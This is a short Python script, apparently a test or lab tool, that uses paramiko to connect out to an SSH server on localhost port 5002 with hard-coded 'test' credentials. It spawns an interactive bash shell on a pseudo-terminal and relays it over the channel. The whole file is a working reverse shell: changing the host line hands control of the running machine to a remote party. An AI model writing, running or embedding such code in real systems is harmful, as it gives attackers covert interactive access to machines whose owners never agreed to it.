#! /usr/bin/env python3

import paramiko
from threading import Thread
import subprocess
import os
import pty

HOST = '127.0.0.1'
USERNAME = 'test'
PASSWORD = 'test'
PORT = 5002
killme = False

def listen(pty, chan):
    global killme
    while True:
        if killme == True:
            break
        chan.send(os.read(pty, 1024))

with paramiko.SSHClient() as c:

    c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    c.connect(HOST, port=PORT, username=USERNAME, password=PASSWORD, compress=True)
    chan = c.get_transport().open_session()
    chan.send('Connexion established. \n')

    #p =  PtyProcessUnicode.spawn(['/bin/bash', '-i'])
    mfd, sfd = pty.openpty()
    p = subprocess.Popen(["/bin/bash", "-i"], stdin=sfd, stdout=sfd, stderr=sfd, start_new_session=True)

    listen_thread = Thread(target=listen, args=(mfd, chan))
    listen_thread.start()
    while True:
        os.write(mfd, chan.recv(1024))
